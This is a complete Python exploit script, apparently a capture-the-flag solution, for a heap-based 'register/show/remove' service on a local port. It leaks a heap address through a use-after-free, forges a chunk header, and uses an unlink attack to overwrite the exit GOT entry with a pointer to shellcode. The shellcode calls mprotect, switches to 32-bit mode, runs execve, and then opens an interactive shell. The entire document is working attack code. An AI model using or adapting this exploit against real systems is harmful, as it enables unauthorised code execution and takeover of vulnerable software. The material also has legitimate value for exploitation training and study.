import socket, struct, telnetlib
from pwn import *


def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)


def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
      data += f.read(1)
    return data


def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


def p(a): return struct.pack("<I",a)
def u(a): return struct.unpack("<I",a)[0]
def p64(a): return struct.pack("<Q",a)
def u64(a): return struct.unpack("<Q",a)[0]


def debug(func):
    def wrapper(*args, **kwargs):
        print "{}({}, {})".format(func.__name__, str(args), str(kwargs))
        return func(*args, **kwargs)
    return wrapper


@debug
def register(date, size, data):
    read_until(f, 'Exit\n>> ')
    f.write('1\n')

    read_until(f, '... ')
    f.write(date + '\n')
    read_until(f, '... ')
    f.write('{}\n'.format(str(size)))
    read_until(f, '>> ')

    f.write(data)


@debug
def show(date):
    read_until(f, 'Exit\n>> ')
    f.write('2\n')

    read_until(f, '... ')
    f.write('{}\n'.format(date))
    read_until(f, '{}\n'.format(date))
    return read_until(f)


@debug
def remove(date):
    read_until(f, 'Exit\n>> ')
    f.write('3\n')

    read_until(f, '... ')
    f.write('{}\n'.format(date))


s, f = sock("127.0.0.1", 4088)


buf = 'A' * 0x20
register('1970/01/01', len(buf), buf)
buf = 'B' * 0x20
register('1970/01/02', len(buf), buf)
buf = 'C' * 0x20
register('1970/01/03', len(buf), buf)

remove('1970/01/02')
remove('1970/01/01')
register('1970/01/04', 0x40, 'D' * 0x28)

data = show('1970/01/04').strip('D').rstrip()
addr_mmapped = u64(data.ljust(8, '\x00')) - 0xf0
print 'addr_mmapped = {}'.format(hex(addr_mmapped))
remove('1970/01/03')
remove('1970/01/04')

register('1970/01/05', 0x30, 'E' * 0x30)
register('1970/01/06', 0x30, 'F' * 0x30)
remove('1970/01/05')

print 'set prev in use to off with fake chunk'
print 'send payload (len = {})'.format(len(buf))
buf = ''
buf += p64(0x602090-0x8*2) # fd (got exit - 0x8*3)
buf += p64(addr_mmapped+0xf4) # bk (shellcode@mmapped)
buf += 'G' * (0x30 - len(buf) - 0x8)
buf += p64(0x38)
buf += '\x28' # set prev in use off
register('1970/01/07', 0x30, buf)

# mprotect(0x602000, 0x1000, 7)
# read(0, 0x602190, 27)
sc = ('''
    xor rax, rax
    mov al, 9
    inc al
    mov rdi, 0x602000
    mov rsi, 0x1000
    mov rdx, 7
    syscall

    mov rax, 0
    xor rdi, rdi
    mov rsi, 0x602100
    mov rdx, 23
    syscall

    mov esp, 0x602160
    mov DWORD PTR [esp+4], 0x23
    mov DWORD PTR [esp], 0x602100
    retf
    ''')


shellcode = ''
shellcode += asm(('''
    nop
    nop
    nop
    nop
    jmp $+0x32
    '''),
    os='linux',
    arch='amd64',
    )
shellcode += '\x90'*60
shellcode += asm(sc, os='linux', arch='amd64') + '\x00'
register('1970/01/08', len(shellcode), shellcode)

print 'unlink attack'
remove('1970/01/06')
print 'done unlink attack. exit got pointing at shellcode?'
print 'call exit so it will jump to shellcode'
read_until(f, '>> ')
f.write('0\n')
read_until(f, 'Bye!')

print 'read in shellcode again'
shellcode = asm(shellcraft.i386.linux.execve('echo hoge'), arch='x86')
print len(shellcode)
f.write(shellcode)

shell(s)
